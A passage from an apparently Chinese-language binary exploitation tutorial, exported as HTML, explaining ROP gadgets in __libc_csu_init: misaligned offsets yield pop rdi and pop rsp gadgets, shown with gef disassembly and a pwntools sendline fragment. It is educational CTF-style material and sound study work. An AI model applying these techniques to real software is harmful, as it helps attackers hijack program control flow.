+p.sendline(payload0)</code></pre></details></li></ul><ul id="5f4a57db-bee9-4c0e-b387-3f2980ca1b2e" class="toggle"><li><details open=""><summary><strong>gadgets2:带1参数的任意函数调用</strong></summary><p id="295b2afa-2ff9-471b-a7e4-6f6e783981bf" class="">在这一处中</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d0c3bba4-1aa6-4542-bac1-b7d8c5b60768" class="code"><code class="language-Python">.text:0000000000400622                 pop     r15
+.text:0000000000400624                 retn</code></pre><p id="17dae126-c117-42f3-ac5d-6bea3fb2fe62" class="">pop r15的硬编码是41 5F</p><p id="4d3e8031-2def-4eac-9ee6-7593e5a7e098" class="">而5F又是pip rdi的硬编码，所以：</p><p id="7cb033ca-147d-4fdd-935e-2a1fe898133b" class="">0x400623处就是一个pop_rdi_ret的gadgets</p><p id="55dfa97f-452b-4179-b009-1858d5c088f4" class="">不过这个用ROPgadgets工具也可以扫出来，所以没有什么特别的</p></details></li></ul><ul id="97663d92-cf16-4382-b28b-7d92d964fdb3" class="toggle"><li><details open=""><summary><strong>gadgets3:控制sp指针</strong></summary><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ef9314a4-eebb-44d6-8c53-1c4aefae5533" class="code"><code class="language-Assembly">gef➤  x/7i 0x000000000040061a;这个是正常的
+0x40061a &lt;__libc_csu_init+90&gt;:  pop    rbx
+0x40061b &lt;__libc_csu_init+91&gt;:  pop    rbp
+0x40061c &lt;__libc_csu_init+92&gt;:  pop    r12
+0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13
+0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14
+0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15
+0x400624 &lt;__libc_csu_init+100&gt;: ret    
+gef➤  x/7i 0x000000000040061d;这个是稍微修改了一下偏移，得到了pop rsp
+0x40061d &lt;__libc_csu_init+93&gt;:  pop    rsp
+0x40061e &lt;__libc_csu_init+94&gt;:  pop    r13
+0x400620 &lt;__libc_csu_init+96&gt;:  pop    r14
+0x400622 &lt;__libc_csu_init+98&gt;:  pop    r15
+0x400624 &lt;__libc_csu_init+100&gt;: ret</code></pre></details></li></ul></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
